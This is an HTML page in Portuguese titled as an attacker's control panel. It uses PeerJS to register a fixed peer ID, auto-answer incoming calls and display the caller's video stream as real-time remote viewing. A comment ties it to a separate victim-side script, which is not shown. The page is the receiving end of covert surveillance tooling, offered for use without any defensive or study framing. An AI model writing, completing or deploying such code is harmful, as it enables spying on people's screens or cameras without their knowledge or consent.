<!DOCTYPE html>
<html>
<head>
    <title>Painel de Controle (Atacante)</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
</head>
<body style="background: #222; color: white; text-align: center;">
    <h2>Visualização Remota em Tempo Real</h2>
    <video id="remoteVideo" autoplay style="width: 90%; border: 2px solid red;"></video>

    <script>
        // O ID aqui deve ser EXATAMENTE o mesmo que você colocou no DESTINO_ID acima
        const peer = new Peer('seu-nome-unico-de-acesso'); 

        peer.on('call', (call) => {
            call.answer(); // Atende a chamada automaticamente
            call.on('stream', (remoteStream) => {
                document.getElementById('remoteVideo').srcObject = remoteStream;
            });
        });

        peer.on('open', (id) => {
            console.log('Aguardando conexão no ID: ' + id);
        });
    </script>
</body>
</html>
